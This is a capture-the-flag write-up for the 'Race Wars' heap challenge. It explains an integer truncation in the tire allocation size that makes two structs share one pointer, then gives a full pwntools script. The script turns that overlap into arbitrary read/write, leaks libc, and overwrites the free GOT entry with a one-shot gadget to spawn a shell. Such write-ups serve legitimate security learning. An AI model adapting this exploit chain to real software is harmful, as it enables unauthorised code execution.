# Race Wars

We are given a binary. Its functionality is quite boring. It lets you create tires, select chassis, engine, and transmission. Afterwards, you can modify these, and/or race, in which you always lose.

Lets start with static analysis. The functionality is also quite bland. There are a ton of branches to each of these options, which assigns different values for different chosen options.

However, there is one big thing of interest you find while reversing. It is the function at 0x400bb6, which is called by all four options, to which values are being assigned. Diving into that function, we quickly find that it serves to allocate memory. There are two branches: if the requested size is greater than 0xfff, then it uses malloc() to allocate memory. However, if it is less, then the binary implements its own malloc implementation with posix_memalign. We also find that for the create tires option, we can control the size, and it mallocs size*32, so we have a controlled malloc size.

Now, custom heap implementations and heaps in general are a pain to statically reverse, so I begin dynamic analysis. Breaking at 0x400b66 and 0x400bb2, I can view the malloc size request and returned pointer. I tried viewing the heap and structs for any overflows and OOBs, to no avail. Then I tried putting in garbage values for tire malloc sizes, and found that huge values causes malloc to return 0x0 and errors out. However, when putting in huge values, I also noticed that, since it gets multiplied by 32, the bits greater than 32 bits get truncated off. So if I can pass in a size of 0x100000000 to malloc, that gets truncated to 0x00000000. I tried entering the tire size 0x100000000/32, and sure enough, the size passed to malloc is 0x0. After playing around with this, I find that the first malloc(0x0) and another malloc(0x18) actually returns the same pointer! We have found our vulnerability - double pointers.

So what can we do with this? The modifying transmission function sounds like a great read and write primitive, because it has built in functionalities to do that for us as long as gear size is large enough. So, if the gear size struct is also the same pointer as another struct we control, then we can modify gear size to an extremely large number, and gain arbitrary read/write primitive. The tire struct is perfect for this, since we control 16 bytes through editing tires:

```
printf("modify what?\n\t(1) width\n\t(2) aspect ratio\n\t(3) construction\n\t(4) diameter\nCHOICE: ");
  __isoc99_scanf("%d", &v5);
  if ( v5 == 2 )
  {
    printf("new aspect_ratio: ", &v5);
    __isoc99_scanf("%d", &v6); //two byte read
    printf("tires are now %d aspect\n", (unsigned __int8)v6);
    *(_WORD *)(a1 + 2) = v6; //two byte write
    goto LABEL_16;
  }
```

So we create a tire and transmission that point to the same malloced chunk. Then we modify tire struct to a huge number by changing all four of its options to -1 (aka 0xffff). Then we can view the transmission, and find that we have arbitrary read and write.

```
tires are now 255 thick
Your Tires are: 655356553565535
modify your car
pick:
        (1) tires
        (2) chassis
        (3) engine
        (4) transmission
        (5) buy new part
        (6) RACE!
CHOICE: 4
choice 4
ok, you have a transmission with 18446744073709551615 gears
which gear to modify?
```

With this, we can leak the heap addresses near the transmission struct, and I found one at offset 0x17. With this we can calculate the address of our transmission struct, and gain read to everything.

Next I leaked libc by reading from putsgot, calculated address of one shot gadget, then overwrote free GOT with it, triggered free, and got a shell.

```python
from pwn import *

def modtire(c, v):
	p.recvuntil('CHOICE: ')
	p.sendline('1')
	p.recvuntil('CHOICE: ')
	p.sendline(str(c))
	p.recvuntil(': ')
	p.sendline(str(v))
def twocomp(val):
	return 0xffffffffffffffff - val + 1
def pow_hash(challenge, solution):
    return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()
def check_pow(challenge, n, solution):
    h = pow_hash(challenge, solution)
    return (int(h, 16) % (2**n)) == 0
def solve_pow(challenge, n):
    candidate = 0
    while True:
        if check_pow(challenge, n, candidate):
            return candidate
        candidate += 1

p = remote('2f76febe.quals2018.oooverflow.io', 31337)
p.recvuntil("Challenge: ")
x=p.recvline()[:-1]
p.recvuntil("n: ")
y=int(p.recvline()[:-1])
p.recv()
ans=solve_pow(x,y)
p.sendline(str(ans))

p.recvuntil('CHOICE: ')
p.sendline('1')
p.sendline(str(0x100000000/32))

p.recvuntil('CHOICE: ')
p.sendline('4')
p.recvuntil('? ')
p.sendline('0')

p.recvuntil('CHOICE: ')
p.sendline('2')
p.sendline('1')

p.recvuntil('CHOICE: ')
p.sendline('3')

modtire('1', '-1')
modtire('2', '-1')
modtire('3', '-1')
modtire('4', '-1')

add = ''
for x in range(0x17, 0x17+8):
	p.recvuntil('CHOICE: ')
	p.sendline('4')
	p.recvuntil('? ')
	p.sendline(str(x + 1))
	p.recvuntil(' is ')
	add += '%02x' % (int(p.recvuntil(',')[:-1]))
	p.sendline('0')
	p.sendline('0')
heapleak = u64(add.decode('hex'))
struct = heapleak - 0x10

distance = struct - 0x603020 #putgot
add = ''
for x in xrange(distance, distance-8, -1):
	p.recvuntil('CHOICE: ')
	p.sendline('4')
	p.recvuntil('? ')
	p.sendline(str(twocomp(x)))
	p.recvuntil('is')
	add += '%02x' % (int(p.recvuntil(',')[:-1]))
	p.sendline('0')
	p.sendline('0')
puts_addr = u64(add.decode('hex'))
print "struct:" + hex(struct)
print 'puts:' + hex(puts_addr)
libc_base = puts_addr - 0x6f690 #put offset
oneshot = libc_base + 0x4526a #oneshot offset
print "oneshot:" + hex(oneshot)
asdf = 0
distance = struct - 0x603018 #free got
for x in xrange(distance, distance - 8, -1):
	p.recvuntil('CHOICE: ')
	p.sendline('4')
	p.recvuntil('? ')
	p.sendline(str(twocomp(x)))
	p.recvuntil('is')
	p.sendline(str(ord(p64(oneshot)[asdf])))
	p.sendline('1')
	asdf += 1

p.recvuntil('CHOICE: ')
p.sendline('6')

p.interactive()
```

## Flag: OOO{4 c0upl3 0f n1554n 5r205 w0uld pull 4 pr3m1um 0n3 w33k b3f0r3 r4c3 w4rz}
